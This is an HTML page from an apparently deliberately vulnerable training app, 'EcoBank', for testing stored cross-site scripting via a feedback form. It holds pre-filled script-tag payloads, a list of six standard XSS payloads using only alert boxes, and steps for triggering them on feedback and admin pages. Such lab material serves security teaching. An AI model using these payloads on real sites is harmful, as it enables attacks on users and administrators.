<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stored XSS Test - EcoBank</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #2c3e50;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 2rem;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }
        .test-form {
            margin-bottom: 2rem;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #2c3e50;
            font-weight: 600;
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
        }
        .form-group textarea {
            min-height: 120px;
            resize: vertical;
        }
        .submit-btn {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 1rem 2rem;
            border: none;
            border-radius: 50px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(231, 76, 60, 0.4);
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
        }
        .payload-examples {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
        }
        .payload-examples h3 {
            color: #e74c3c;
            margin-bottom: 0.5rem;
        }
        .payload-examples code {
            background: #e9ecef;
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            display: block;
            margin: 0.5rem 0;
        }
        .view-btn {
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            color: white;
            padding: 0.8rem 1.5rem;
            border: none;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            margin: 0.5rem;
            display: inline-block;
        }
        .view-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(39, 174, 96, 0.4);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🗄️ Stored XSS Vulnerability Test - EcoBank</h1>
        
        <div class="warning">
            <strong>⚠️ Educational Purpose Only!</strong><br>
            This page is designed to demonstrate stored XSS vulnerabilities for cybersecurity education.
            Only use in controlled environments with proper authorization.
        </div>

        <div class="test-form">
            <h2>Test Stored XSS</h2>
            <form method="POST" action="feedback.php">
                <div class="form-group">
                    <label for="name">Malicious Name:</label>
                    <input type="text" id="name" name="name" placeholder="Enter XSS payload..." value="&lt;script&gt;alert('Stored XSS via Name')&lt;/script&gt;">
                </div>
                
                <div class="form-group">
                    <label for="email">Malicious Email:</label>
                    <input type="text" id="email" name="email" placeholder="Enter XSS payload..." value="&lt;script&gt;alert('Stored XSS via Email')&lt;/script&gt;">
                </div>
                
                <div class="form-group">
                    <label for="message">Malicious Message:</label>
                    <textarea id="message" name="message" placeholder="Enter XSS payload...">&lt;script&gt;alert('Stored XSS via Message')&lt;/script&gt;</textarea>
                </div>
                
                <button type="submit" class="submit-btn">🚀 Inject Stored XSS</button>
            </form>
            
            <div style="margin-top: 1rem;">
                <a href="feedback.php" class="view-btn">📋 View Feedback Page</a>
                <a href="admin_feedback.php" class="view-btn">👤 View Admin Panel</a>
            </div>
        </div>

        <div class="payload-examples">
            <h3>🔍 How Stored XSS Works:</h3>
            <ol>
                <li><strong>Submit malicious payload</strong> via feedback form</li>
                <li><strong>Payload stored</strong> in database without sanitization</li>
                <li><strong>Script executes</strong> when anyone views the feedback page</li>
                <li><strong>Affects all users</strong> who view the stored content</li>
                <li><strong>Persistent attack</strong> - remains until data is removed</li>
            </ol>
            
            <h3>Example Stored XSS Payloads:</h3>
            <code>&lt;script&gt;alert('Stored XSS Attack')&lt;/script&gt;</code>
            <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
            <code>&lt;svg onload=alert('XSS')&gt;</code>
            <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code>
            <code>&lt;body onload=alert('XSS')&gt;</code>
            <code>&lt;input type="text" value="&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;</code>
        </div>

        <div style="margin-top: 2rem;">
            <h3>📡 Test Steps:</h3>
            <ol>
                <li>Submit malicious payload using the form above</li>
                <li>Click "View Feedback Page" to see stored XSS execution</li>
                <li>Click "View Admin Panel" to see XSS in admin interface</li>
                <li>Observe alerts executing when pages load</li>
            </ol>
        </div>

        <div style="margin-top: 2rem;">
            <a href="index.php" style="color: #27ae60; text-decoration: none;">🏠 Back to EcoBank</a>
        </div>
    </div>
</body>
</html>
